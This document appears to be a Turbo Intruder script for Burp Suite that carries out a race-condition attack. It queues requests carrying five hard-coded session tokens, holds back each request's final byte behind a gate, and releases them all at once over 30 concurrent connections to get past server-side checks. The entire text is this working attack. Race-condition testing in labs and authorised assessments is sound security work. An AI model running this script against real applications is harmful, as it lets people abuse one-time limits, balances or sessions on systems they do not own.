def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for sess in ["p5b2nr48govua1ieljfdecppjg", "48ncr9hc1rjm361fp7h17110ar", "0411kdhfmca5uqiappmc3trgcg", "m3qv0d1qu7omrtm2rooivr7lc4", "onerh3j83jopd5ul8scjaf14rr"]:
        engine.queue(target.req, sess, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)